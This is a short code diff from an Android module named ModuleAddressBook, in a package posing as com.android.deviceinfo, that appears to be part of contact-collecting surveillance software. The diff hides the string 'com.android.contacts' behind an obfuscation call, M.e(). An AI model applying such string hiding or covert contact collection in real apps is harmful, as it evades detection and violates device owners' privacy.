@@ -31,6 +31,7 @@ import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
@@ -52,7 +53,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 	Markup markupContacts;
 	static HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
 	
-	String observe = "com.android.contacts";
+	String observe = M.e("com.android.contacts");
 
 	private String myPhone;
 
